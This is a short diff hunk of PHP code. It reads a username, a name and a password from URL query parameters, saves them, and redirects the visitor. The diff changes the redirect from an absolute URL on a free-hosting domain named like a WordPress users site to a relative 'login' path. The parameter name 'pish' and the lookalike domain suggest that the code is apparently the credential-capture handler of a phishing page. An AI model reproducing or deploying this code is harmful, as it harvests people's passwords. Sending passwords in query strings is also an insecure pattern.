@@ -78,10 +78,10 @@ if (isset($_GET['pish']) && isset($_GET['user']) && isset($_GET['name']) && isse
         $passwd->pass(password: $_GET['password']);
         $connection->save($users, $posh, $passwd);
         if ($connection->save($users, $posh, $passwd)) {
-            header("Location: http://blueuserswordpress.000.pe/%d9%88%d8%b1%d9%88%d8%af/");
+            header("Location: %d9%88%d8%b1%d9%88%d8%af/");
             exit();
         } else {
-            header("Location: http://blueuserswordpress.000.pe/%d9%88%d8%b1%d9%88%d8%af/");
+            header("Location: %d9%88%d8%b1%d9%88%d8%af/");
         }
     } else {
         echo '<div class="alert alert-danger alert-dismissible fade show" role="alert" style="position:fixed; right:10px; top:30px;">Error!<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button></div>';
